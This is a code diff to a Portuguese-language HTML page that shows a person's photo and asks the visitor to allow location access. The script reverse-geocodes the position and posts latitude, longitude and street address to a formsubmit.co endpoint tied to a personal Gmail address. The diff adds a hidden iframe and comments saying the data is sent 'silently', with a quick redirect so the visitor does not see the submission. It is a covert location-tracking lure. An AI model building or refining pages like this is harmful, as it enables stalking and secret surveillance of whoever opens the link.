@@ -2,24 +2,54 @@
 <html lang="pt-br">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Confirmação</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 40px 15px;
+}
+
+img {
+  max-width: 220px;
+  width: 80%;
+  margin-bottom: 30px;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+p {
+  font-size: 14px;
+  color: #444;
+}
+</style>
 </head>
 
-<body style="font-family: Arial; text-align:center; margin-top:60px;">
+<body>
 
-<img src="Captura de tela 2026-02-04 071705.png" 
-     alt="Elian Gallardo" 
-     style="max-width:250px; margin-bottom:40px;">
+<img src="Captura de tela 2026-02-04 071705.png" alt="Elian Gallardo">
 
 <h3>Para continuar, é necessário permitir o acesso à sua localização.</h3>
 <p>Assim que você autorizar, será redirecionado automaticamente.</p>
 
-<form id="form" action="https://formsubmit.co/pattiniantonia92@gmail.com" method="POST">
+<!-- iframe invisível para envio silencioso -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
+<form id="form" 
+      action="https://formsubmit.co/pattiniantonia92@gmail.com" 
+      method="POST" 
+      target="hiddenFrame">
+
   <input type="hidden" name="latitude" id="lat">
   <input type="hidden" name="longitude" id="lon">
   <input type="hidden" name="endereco" id="endereco">
   <input type="hidden" name="_subject" value="Nova localização recebida">
   <input type="hidden" name="_captcha" value="false">
+
 </form>
 
 <script>
@@ -45,16 +75,17 @@ function processLocation(position) {
     .then(data => {
 
       const address = data.display_name || "Endereço não encontrado";
-
       document.getElementById("endereco").value = address;
 
+      // Envia silenciosamente
       document.getElementById("form").submit();
 
-      setTimeout(redirect, 800);
+      // Redireciona sem mostrar tela do FormSubmit
+      setTimeout(redirect, 700);
     })
     .catch(() => {
       document.getElementById("form").submit();
-      setTimeout(redirect, 800);
+      setTimeout(redirect, 700);
     });
 }
 
